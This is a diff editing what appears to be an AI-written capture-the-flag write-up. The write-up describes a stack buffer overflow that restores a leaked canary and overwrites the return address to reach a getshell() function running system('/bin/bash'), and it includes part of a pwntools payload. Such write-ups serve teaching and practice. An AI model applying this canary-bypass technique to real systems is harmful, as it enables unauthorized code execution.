@@ -1,4 +1,3 @@
-Here is the writeup for the challenge, focusing on the exploit methodology.
 
 ---
 
@@ -45,7 +44,6 @@ The layout is:
 Sending the payload overwrites the return address. When `vuln()` returns, execution flow jumps to `getshell()`, executing `system("/bin/bash")`.
 
 ```python
-# Summary of Payload Structure
 payload = flat(
     b'A' * 104,           # Buffer padding
     canary_leak,          # Restore Canary
@@ -57,5 +55,3 @@ payload = flat(
 ```
 
 ---
-
-**Would you like me to generate a GDB script to help you visualize the stack layout and verify the canary offset dynamically?**
